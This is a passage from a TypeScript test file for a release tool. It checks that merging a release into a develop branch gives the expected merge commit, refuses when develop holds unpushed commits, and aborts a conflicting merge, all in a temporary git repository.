      repo.git('commit', '-qam', 'feat: more develop work');
      repo.git('update-ref', 'refs/remotes/origin/develop', 'HEAD');
      return out(repo, 'rev-parse', 'HEAD');
    };
    const E = moveDevelop(D, 'README.md', '# moved\n');
    const merged = landOnDevelop(repo.dir, R, '1.1.0') as string;
    assert.equal(out(repo, 'rev-list', '--parents', '-n', '1', merged), `${merged} ${E} ${R}`);
    assert.equal(out(repo, 'log', '-1', '--format=%s', merged), 'Release 1.1.0');
    assert.equal(out(repo, 'rev-parse', 'HEAD'), merged);
    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), merged, 'a declined merge is pushed as it is');

    // A develop with anything but the landing refuses, since the push would carry it too: a commit origin/develop
    // lacks and no landing, a commit after the merge or under it, or one after the fast-forward.
    const unpushed = (from: string, text: string) => {
      repo.git('reset', '-q', '--hard', from);
      fs.writeFileSync(path.join(repo.dir, 'README.md'), text);
      repo.git('commit', '-qam', 'feat: unpushed');
    };
    const differs = (what: string) =>
      assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /develop differs from origin\/develop/.test(e.message), what);
    unpushed(E, '# unpushed\n');
    differs('an unpushed commit and no landing');
    unpushed(merged, '# after the merge\n');
    differs('a commit after the merge');
    unpushed(E, '# under the merge\n');
    repo.git('merge', '-q', '--no-ff', '-m', 'Release 1.1.0', R);
    differs('a commit under the merge');
    repo.git('update-ref', 'refs/remotes/origin/develop', D);
    unpushed(R, '# after the fast-forward\n');
    differs('a commit after the fast-forward');

    // One the release conflicts with refuses too, and aborts the merge.
    const E2 = moveDevelop(D, 'package.json', JSON.stringify({ name: 'forge', version: '1.0.1' }));
    assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /does not merge cleanly/.test(e.message));
    assert.equal(out(repo, 'rev-parse', 'HEAD'), E2, 'the merge was aborted');
    assert.equal(out(repo, 'status', '--porcelain', '--untracked-files=all'), '', 'a clean tree');
  } finally {
    repo.cleanup();
    fs.rmSync(notesDir, { recursive: true, force: true });
  }
});
